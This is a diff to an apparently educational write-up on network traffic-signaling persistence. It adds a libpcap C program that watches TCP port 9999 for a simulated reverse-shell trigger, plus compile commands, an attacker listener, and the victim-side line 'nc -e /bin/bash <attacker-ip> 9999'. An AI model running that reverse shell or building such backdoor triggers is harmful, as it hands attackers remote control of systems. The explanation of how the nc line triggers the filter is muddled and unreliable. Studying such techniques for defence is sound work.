@@ -15,42 +15,69 @@ Once an adversary compromises a system, they may seek to maintain persistence th
 
 ***Example:*** an adversary may install a filter on **eth0** (the primary network interface) to monitor TCP traffic on a specific port (e.g. 9999), which they’ll later use to communicate with a reverse shell or to send commands.
 
+**libpcap-dev installation**
+   `sudo apt install libpcap-dev`
 
     #include <pcap.h>
     #include <stdio.h>
+    #include <stdlib.h>
+    
+    // Declare the packet handler function before main
+    void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet);
     
     int main() {
         char errbuf[PCAP_ERRBUF_SIZE];
         pcap_t *handle;
     
-        // Open the device for packet capture
-        handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);
+        // Open network interface for packet capture
+        handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1000, errbuf); // Adjust the interface name
         if (handle == NULL) {
             fprintf(stderr, "Error opening device: %s\n", errbuf);
             return 1;
         }
     
-        // Set the packet filter to capture only TCP traffic on port 9999
+        // Set a filter for TCP traffic on port 9999 (reverse shell port)
         struct bpf_program fp;
-        char filter_exp[] = "tcp port 9999";  // Custom filter for reverse shell traffic
+        char filter_exp[] = "tcp port 9999";
         if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
             fprintf(stderr, "Error compiling filter\n");
             return 1;
         }
-    
         if (pcap_setfilter(handle, &fp) == -1) {
             fprintf(stderr, "Error setting filter\n");
             return 1;
         }
     
-        // Start capturing packets
+        // Start capturing packets, invoking the packet handler on each match
+        printf("Listening for traffic on port 9999...\n");
         pcap_loop(handle, 0, packet_handler, NULL);
     
+        // Close the capture handle after the loop finishes
         pcap_close(handle);
         return 0;
     }
+    
+    // Define the packet handler function
+    void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
+        // Print out some basic info about the captured packet
+        printf("Captured a packet matching the filter!\n");
+        printf("Packet Length: %d bytes\n", pkthdr->len);
+    
+        // Simulate reverse shell activation
+        printf("Simulating reverse shell activation...\n");
+    
+        // Additional actions can be triggered here based on packet contents
+    }
+
 
 This code uses **libpcap** to set a filter that monitors for TCP packets on port 9999. The adversary could tailor the filter to match specific conditions, ensuring that only traffic related to their backdoor is processed. Once the filter is set, no immediate actions will be visible, which makes detection harder.
+
+**Compile the program**
+   `gcc -o packet_capture packet_capture.c -lpcap`
+
+**Run the program**
+   `sudo ./packet_capture`
+
 
 #### **2. Sending Crafted Packets to Trigger Reverse Shell**
 
@@ -58,8 +85,13 @@ Once the filter is active, the adversary can send a specially crafted packet to 
 
 For instance, using **netcat** or another tool, the attacker may initiate a reverse shell connection through the specified port:
 
-***Attacker's machine sends a reverse shell connection to port 9999 on the target***
-`nc -e /bin/bash 192.168.1.100 9999` 
+
+**Set up the Reverse Shell Listener on adversary**
+   `nc -lvnp 9999`
+
+
+***Send a Packet to Trigger the Filter on victim machine***
+`nc -e /bin/bash <attacker-ip> 9999` 
 
 This command establishes a reverse shell to the attacker's machine, and since the filter is set to listen on port 9999, it will trigger the reverse shell activation when the packet is received.
 
